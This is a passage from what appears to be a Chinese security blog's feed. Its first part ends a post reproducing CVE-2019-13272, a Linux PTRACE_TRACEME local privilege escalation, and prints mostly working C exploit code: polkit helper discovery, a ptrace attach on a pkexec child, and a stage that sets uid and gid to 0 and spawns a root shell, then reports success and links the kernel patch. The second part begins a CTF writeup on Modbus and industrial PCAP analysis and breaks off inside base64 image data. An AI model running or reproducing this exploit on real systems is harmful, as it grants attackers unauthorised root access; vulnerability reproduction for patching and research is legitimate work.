</span>&#123;</span><br><span class="line">  <span class="comment">/* our child is hanging in signal delivery from execve()'s SIGTRAP */</span></span><br><span class="line">  <span class="keyword">pid_t</span> child = SAFE(waitpid(<span class="number">-1</span>, &amp;dummy_status, <span class="number">0</span>));</span><br><span class="line">  force_exec_and_wait(child, <span class="number">42</span>, <span class="string">"stage3"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// * * * * * * * * * * * * * * * * root shell * * * * * * * * * * * * * * * * *</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">spawn_shell</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  SAFE(setresgid(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>));</span><br><span class="line">  SAFE(setresuid(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>));</span><br><span class="line">  execlp(SHELL, basename(SHELL), <span class="literal">NULL</span>);</span><br><span class="line">  dprintf(<span class="string">"[-] execlp: Executing shell %s failed"</span>, SHELL);</span><br><span class="line">  <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// * * * * * * * * * * * * * * * * * Detect * * * * * * * * * * * * * * * * * *</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">check_env</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span>* xdg_session = getenv(<span class="string">"XDG_SESSION_ID"</span>);</span><br><span class="line"></span><br><span class="line">  dprintf(<span class="string">"[.] Checking environment ...\n"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (stat(pkexec_path, &amp;st) != <span class="number">0</span>) &#123;</span><br><span class="line">    dprintf(<span class="string">"[-] Could not find pkexec executable at %s"</span>, pkexec_path);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (stat(pkaction_path, &amp;st) != <span class="number">0</span>) &#123;</span><br><span class="line">    dprintf(<span class="string">"[-] Could not find pkaction executable at %s"</span>, pkaction_path);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (xdg_session == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    dprintf(<span class="string">"[!] Warning: $XDG_SESSION_ID is not set\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (system(<span class="string">"/bin/loginctl --no-ask-password show-session $XDG_SESSION_ID | /bin/grep Remote=no &gt;&gt;/dev/null 2&gt;&gt;/dev/null"</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">    dprintf(<span class="string">"[!] Warning: Could not find active PolKit agent\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (stat(<span class="string">"/usr/sbin/getsebool"</span>, &amp;st) == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (system(<span class="string">"/usr/sbin/getsebool deny_ptrace 2&gt;1 | /bin/grep -q on"</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">      dprintf(<span class="string">"[!] Warning: SELinux deny_ptrace is enabled\n"</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  dprintf(<span class="string">"[~] Done, looks good\n"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Use pkaction to search PolKit policy actions for viable helper executables.</span></span><br><span class="line"><span class="comment"> * Check each action for allow_active=yes, extract the associated helper path,</span></span><br><span class="line"><span class="comment"> * and check the helper path exists.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">find_helpers</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> cmd[<span class="number">1024</span>];</span><br><span class="line">  <span class="built_in">snprintf</span>(cmd, <span class="keyword">sizeof</span>(cmd), <span class="string">"%s --verbose"</span>, pkaction_path);</span><br><span class="line">  FILE *fp;</span><br><span class="line">  fp = popen(cmd, <span class="string">"r"</span>);</span><br><span class="line">  <span class="keyword">if</span> (fp == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    dprintf(<span class="string">"[-] Failed to run: %s\n"</span>, cmd);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">char</span> line[<span class="number">1024</span>];</span><br><span class="line">  <span class="keyword">char</span> buffer[<span class="number">2048</span>];</span><br><span class="line">  <span class="keyword">int</span> helper_index = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">int</span> useful_action = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">char</span> *needle = <span class="string">"org.freedesktop.policykit.exec.path -&gt; "</span>;</span><br><span class="line">  <span class="keyword">int</span> needle_length = <span class="built_in">strlen</span>(needle);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (fgets(line, <span class="keyword">sizeof</span>(line)<span class="number">-1</span>, fp) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="comment">/* check the action uses allow_active=yes*/</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">"implicit active:"</span>)) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">"yes"</span>)) &#123;</span><br><span class="line">        useful_action = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (useful_action == <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    useful_action = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* extract the helper path */</span></span><br><span class="line">    <span class="keyword">int</span> length = <span class="built_in">strlen</span>(line);</span><br><span class="line">    <span class="keyword">char</span>* found = memmem(&amp;line[<span class="number">0</span>], length, needle, needle_length);</span><br><span class="line">    <span class="keyword">if</span> (found == <span class="literal">NULL</span>)</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(buffer, <span class="number">0</span>, <span class="keyword">sizeof</span>(buffer));</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; found[needle_length + i] != <span class="string">'\n'</span>; i++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (i &gt;= <span class="keyword">sizeof</span>(buffer)<span class="number">-1</span>)</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      buffer[i] = found[needle_length + i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strstr</span>(&amp;buffer[<span class="number">0</span>], <span class="string">"/xf86-video-intel-backlight-helper"</span>) != <span class="number">0</span> ||</span><br><span class="line">      <span class="built_in">strstr</span>(&amp;buffer[<span class="number">0</span>], <span class="string">"/cpugovctl"</span>) != <span class="number">0</span> ||</span><br><span class="line">      <span class="built_in">strstr</span>(&amp;buffer[<span class="number">0</span>], <span class="string">"/package-system-locked"</span>) != <span class="number">0</span> ||</span><br><span class="line">      <span class="built_in">strstr</span>(&amp;buffer[<span class="number">0</span>], <span class="string">"/cddistupgrader"</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">      dprintf(<span class="string">"[.] Ignoring blacklisted helper: %s\n"</span>, &amp;buffer[<span class="number">0</span>]);</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* check the path exists */</span></span><br><span class="line">    <span class="keyword">if</span> (stat(&amp;buffer[<span class="number">0</span>], &amp;st) != <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">    helpers[helper_index] = strndup(&amp;buffer[<span class="number">0</span>], <span class="built_in">strlen</span>(buffer));</span><br><span class="line">    helper_index++;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (helper_index &gt;= <span class="keyword">sizeof</span>(helpers)/<span class="keyword">sizeof</span>(helpers[<span class="number">0</span>]))</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  pclose(fp);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// * * * * * * * * * * * * * * * * * Main * * * * * * * * * * * * * * * * *</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ptrace_traceme_root</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  dprintf(<span class="string">"[.] Using helper: %s\n"</span>, helper_path);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">   * set up a pipe such that the next write to it will block: packet mode,</span></span><br><span class="line"><span class="comment">   * limited to one packet</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  SAFE(pipe2(block_pipe, O_CLOEXEC|O_DIRECT));</span><br><span class="line">  SAFE(fcntl(block_pipe[<span class="number">0</span>], F_SETPIPE_SZ, <span class="number">0x1000</span>));</span><br><span class="line">  <span class="keyword">char</span> dummy = <span class="number">0</span>;</span><br><span class="line">  SAFE(write(block_pipe[<span class="number">1</span>], &amp;dummy, <span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* spawn pkexec in a child, and continue here once our child is in execve() */</span></span><br><span class="line">  dprintf(<span class="string">"[.] Spawning suid process (%s) ...\n"</span>, pkexec_path);</span><br><span class="line">  <span class="keyword">static</span> <span class="keyword">char</span> middle_stack[<span class="number">1024</span>*<span class="number">1024</span>];</span><br><span class="line">  <span class="keyword">pid_t</span> midpid = SAFE(clone(middle_main, middle_stack+<span class="keyword">sizeof</span>(middle_stack),</span><br><span class="line">                            CLONE_VM|CLONE_VFORK|SIGCHLD, <span class="literal">NULL</span>));</span><br><span class="line">  <span class="keyword">if</span> (!middle_success) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">   * wait for our child to go through both execve() calls (first pkexec, then</span></span><br><span class="line"><span class="comment">   * the executable permitted by polkit policy).</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">int</span> fd = open(tprintf(<span class="string">"/proc/%d/comm"</span>, midpid), O_RDONLY);</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">int</span> buflen = SAFE(read(fd, buf, <span class="keyword">sizeof</span>(buf)<span class="number">-1</span>));</span><br><span class="line">    buf[buflen] = <span class="string">'\0'</span>;</span><br><span class="line">    *strchrnul(buf, <span class="string">'\n'</span>) = <span class="string">'\0'</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strncmp</span>(buf, basename(helper_path), <span class="number">15</span>) == <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    usleep(<span class="number">100000</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">   * our child should have gone through both the privileged execve() and the</span></span><br><span class="line"><span class="comment">   * following execve() here</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  dprintf(<span class="string">"[.] Tracing midpid ...\n"</span>);</span><br><span class="line">  SAFE(ptrace(PTRACE_ATTACH, midpid, <span class="number">0</span>, <span class="literal">NULL</span>));</span><br><span class="line">  SAFE(waitpid(midpid, &amp;dummy_status, <span class="number">0</span>));</span><br><span class="line">  dprintf(<span class="string">"[~] Attached to midpid\n"</span>);</span><br><span class="line"></span><br><span class="line">  force_exec_and_wait(midpid, <span class="number">0</span>, <span class="string">"stage2"</span>);</span><br><span class="line">  <span class="built_in">exit</span>(EXIT_SUCCESS);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">"stage2"</span>) == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> middle_stage2();</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">"stage3"</span>) == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> spawn_shell();</span><br><span class="line"></span><br><span class="line">  dprintf(<span class="string">"Linux 4.10 &lt; 5.1.17 PTRACE_TRACEME local root (CVE-2019-13272)\n"</span>);</span><br><span class="line"></span><br><span class="line">  check_env();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (argc &gt; <span class="number">1</span> &amp;&amp; <span class="built_in">strcmp</span>(argv[<span class="number">1</span>], <span class="string">"check"</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Search for known helpers defined in 'known_helpers' array */</span></span><br><span class="line">  dprintf(<span class="string">"[.] Searching for known helpers ...\n"</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="keyword">sizeof</span>(known_helpers)/<span class="keyword">sizeof</span>(known_helpers[<span class="number">0</span>]); i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (stat(known_helpers[i], &amp;st) == <span class="number">0</span>) &#123;</span><br><span class="line">      helper_path = known_helpers[i];</span><br><span class="line">      dprintf(<span class="string">"[~] Found known helper: %s\n"</span>, helper_path);</span><br><span class="line">      ptrace_traceme_root();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Search polkit policies for helper executables */</span></span><br><span class="line">  dprintf(<span class="string">"[.] Searching for useful helpers ...\n"</span>);</span><br><span class="line">  find_helpers();</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="keyword">sizeof</span>(helpers)/<span class="keyword">sizeof</span>(helpers[<span class="number">0</span>]); i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (helpers[i] == <span class="literal">NULL</span>)</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (stat(helpers[i], &amp;st) == <span class="number">0</span>) &#123;</span><br><span class="line">      helper_path = helpers[i];</span><br><span class="line">      ptrace_traceme_root();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译执行</p><p><img src="https://user-images.githubusercontent.com/38073810/62098299-4f90db80-b2bc-11e9-8437-8e8756e78a13.png" alt="image-20190730100614610"></p><p>提权成功</p><p>由于该漏洞利用简单，影响范围广，建议用户在第一时间安装补丁修复。</p><h3 id="漏洞修复补丁"><a href="#漏洞修复补丁" class="headerlink" title="漏洞修复补丁"></a>漏洞修复补丁</h3><p><a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=6994eefb0053799d2e07cd140df6c2ea106c41ee" target="_blank" rel="noopener">Download</a></p><h3 id="漏洞相关信息："><a href="#漏洞相关信息：" class="headerlink" title="漏洞相关信息："></a>漏洞相关信息：</h3><p><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1903" target="_blank" rel="noopener">about</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;CVE-2019-13272漏洞复现&quot;&gt;&lt;a href=&quot;#CVE-2019-13272漏洞复现&quot; class=&quot;headerlink&quot; title=&quot;CVE-2019-13272漏洞复现&quot;&gt;&lt;/a&gt;CVE-2019-13272漏洞复现&lt;/h2&gt;&lt;h3 id=&quot;引
      
    
    </summary>
    
      <category term="漏洞复现" scheme="https:///login546.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="CVE-2019-13272" scheme="https:///login546.github.io/tags/CVE-2019-13272/"/>
    
  </entry>
  
  <entry>
    <title>2019工业信息安全技能大赛个人线上赛第一场writeup</title>
    <link href="https:///login546.github.io/2019/07/29/2019%E5%B7%A5%E4%B8%9A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E4%B8%AA%E4%BA%BA%E7%BA%BF%E4%B8%8A%E8%B5%9BNO-1writeup/"/>
    <id>https:///login546.github.io/2019/07/29/2019工业信息安全技能大赛个人线上赛NO-1writeup/</id>
    <published>2019-07-29T10:25:16.000Z</published>
    <updated>2021-01-22T08:48:08.990Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2019年工业信息安全技能大赛个人线上赛-第一场-writeup"><a href="#2019年工业信息安全技能大赛个人线上赛-第一场-writeup" class="headerlink" title="2019年工业信息安全技能大赛个人线上赛(第一场)writeup"></a>2019年工业信息安全技能大赛个人线上赛(第一场)writeup</h1><h2 id="1-1-Modbus协议分析（签到题）-未解决"><a href="#1-1-Modbus协议分析（签到题）-未解决" class="headerlink" title="1.1.Modbus协议分析（签到题）[未解决]"></a>1.1.Modbus协议分析（签到题）[未解决]</h2><p>题目：黑客通过外网进入一家工厂的控制网络，之后对工控网络中的操作员站系统进行了攻击，最终通过工控协议破坏了正常的业务。我们得到了操作员站在攻击前后的网络流量数据包，我们需要分析流量中的蛛丝马迹，找到FLAG。</p><p>附件下载：<a href="https://www.lanzous.com/b864349" target="_blank" rel="noopener">1.1.Modbus协议分析（签到题）</a></p><p>利用<a href="https://github.com/scu-igroup/ctf_ics_traffic" target="_blank" rel="noopener">scu–igroup</a>得到如下</p><p><img src="https://user-images.githubusercontent.com/38073810/62021762-72a78680-b1fb-11e9-86d4-e1ea755eeb60.png" alt="6ED8204B-0D39-46CB-A487-722EDF12AD8C"></p><p>得到的是16进制，我目前暂未解决，但是感觉就是70，我们去<a href="https://www.bejson.com/convert/ox2str/" target="_blank" rel="noopener">转换字符</a>，得到</p><p><img src="https://user-images.githubusercontent.com/38073810/62021779-8f43be80-b1fb-11e9-973b-4ec0d546bb66.png" alt="image"></p><p>去提交，试了好多种格式，还是不对，可能不是这个包吧（逃。</p><h3 id="注："><a href="#注：" class="headerlink" title="注："></a>注：</h3><p>比赛结束后，经人指点，说我这个包不是签到题的那个，我。。。。。我再去下载一看还真不是，难道是我搞错了？</p><p>莫名其妙。 下面是我找到的flag，瑟瑟发抖。麻痹大意。（逃。</p><p><img src="https://user-images.githubusercontent.com/38073810/62022554-7937fd00-b1ff-11e9-81cf-24aad5c6ea6a.png" alt="image"></p><h2 id="1-2-工业协议分析1"><a href="#1-2-工业协议分析1" class="headerlink" title="1.2.工业协议分析1"></a>1.2.工业协议分析1</h2><p>题目：工业网络中存在异常，尝试通过分析PCAP流量包，分析出流量数据中的异常点，并拿到FLAG。</p><p>附件下载：<a href="https://www.lanzous.com/b864350" target="_blank" rel="noopener">1.2.工业协议分析1</a></p><p>首先利用<a href="https://github.com/scu-igroup/ctf_ics_traffic" target="_blank" rel="noopener">scu–igroup</a>大佬的脚本跑了下，未发现有用的信息。之后放到kali里面搜了下关键词png，发现了base64加密的图片</p><p><img src="https://user-images.githubusercontent.com/38073810/62021793-a4b8e880-b1fb-11e9-80c9-fbede62bb56c.jpg" alt="6C87E706BFE7D1B12BA8637FCA6E6856"></p><p>导出数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data:image/png;base64,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